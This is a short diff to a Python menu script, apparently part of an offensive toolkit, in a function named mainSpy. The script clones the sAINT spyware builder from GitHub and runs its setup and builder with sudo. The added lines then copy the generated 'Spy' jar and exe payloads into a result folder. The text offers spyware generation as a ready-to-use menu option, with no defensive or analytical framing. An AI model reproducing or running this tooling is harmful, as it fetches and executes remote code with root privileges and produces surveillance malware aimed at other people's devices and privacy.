@@ -502,6 +502,10 @@ def mainSpy():
             os.system("cd modules/ && git clone https://github.com/tiagorlampert/sAINT && cd sAINT && chmod +x configure.sh && sudo ./configure.sh ")
         
         os.system("cd modules/sAINT && sudo java -jar sAINT.jar")
+        print("\n\n")
+        print("Spy Saved in {}result/sAINT{}.jar an .exe".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
+        os.system("sudo cp modules/sAINT/target/saint-1.0-jar-with-dependencies.jar result/sAINT.jar")
+        os.system("sudo cp modules/sAINT/target/saint-1.0-jar-with-dependencies.exe result/sAINT.exe")
         mainSpy()
 
     elif options == '99':
